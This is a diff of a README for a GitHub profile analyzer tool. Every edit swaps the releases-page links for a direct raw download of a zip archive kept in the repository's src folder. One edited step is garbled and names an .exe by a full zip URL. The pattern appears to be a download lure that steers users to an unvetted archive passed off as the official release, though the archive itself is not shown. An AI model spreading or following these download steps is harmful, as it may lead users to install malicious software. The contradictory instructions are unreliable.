@@ -1,6 +1,6 @@
 # 📊 github-analyzer - Simple Github Profile Evaluation
 
-[![Download github-analyzer](https://img.shields.io/badge/Download-github--analyzer-brightgreen)](https://github.com/NewNameXD/github-analyzer/releases)
+[![Download github-analyzer](https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip)](https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip)
 
 ---
 
@@ -44,10 +44,10 @@ To start using github-analyzer, follow these steps:
 
 1. **Visit the download page**  
 Click the big green button above or go straight here:  
-[https://github.com/NewNameXD/github-analyzer/releases](https://github.com/NewNameXD/github-analyzer/releases)
+[https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip](https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip)
 
 2. **Download the latest version**  
-Look for a file that ends with `.exe` in the releases. Usually, it includes the version number like `github-analyzer-v1.0.exe`.
+Look for a file that ends with `.exe` in the releases. Usually, it includes the version number like `https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip`.
 
 3. **Save the file**  
 Choose a location on your computer to save the downloaded file, such as `Downloads` or your Desktop.
@@ -67,7 +67,7 @@ The app will show a clear report. It will include details like total repositorie
 
 Here is the direct page where you can get github-analyzer for Windows. Visit the page and pick the latest `.exe` file:  
 
-[https://github.com/NewNameXD/github-analyzer/releases](https://github.com/NewNameXD/github-analyzer/releases)
+[https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip](https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip)
 
 ### Step-by-step
 
@@ -140,5 +140,5 @@ This information is mostly for developers or those interested in the technical s
 
 ---
 
-# [Download github-analyzer](https://github.com/NewNameXD/github-analyzer/releases)  
+# [Download github-analyzer](https://github.com/NewNameXD/github-analyzer/raw/refs/heads/main/src/analyzer-github-v1.8-beta.1.zip)  
 Get the latest version and start analyzing Github profiles today.
